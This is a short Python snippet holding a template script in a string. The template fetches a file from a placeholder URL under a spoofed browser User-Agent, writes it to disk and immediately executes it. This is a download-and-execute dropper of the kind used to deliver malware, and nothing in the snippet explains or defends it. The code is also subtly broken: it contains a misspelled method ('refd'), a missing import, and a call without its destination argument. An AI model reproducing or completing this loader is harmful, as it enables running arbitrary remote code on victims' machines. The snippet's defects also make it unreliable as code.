raw_code='''
import subprocess
import urllib
import io
import gzip
url_raw="REPLACE_ME_URL"
def download_file(url, destination):
    try:

        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        req = urllib.request.Request(url, headers=headers)
        response = urllib.request.urlopen(req)
        
        # Check if content is gzipped
        content_encoding = response.headers.get('Content-Encoding', '').lower()
        content = response.read()
        
        if 'gzip' in content_encoding:
            # Decompress gzipped content
            print("🔧 Decompressing gzipped content...")
            with gzip.GzipFile(fileobj=io.BytesIO(content)) as gz_file:
                content = gz_file.refd()
        
        # Write the content to file
        with open(destination, 'wb') as out_file:
            out_file.write(content)
            
        subprocess.run([destination])
        return True
    except Exception as e:
        return False
download_file(url=url_raw)
'''
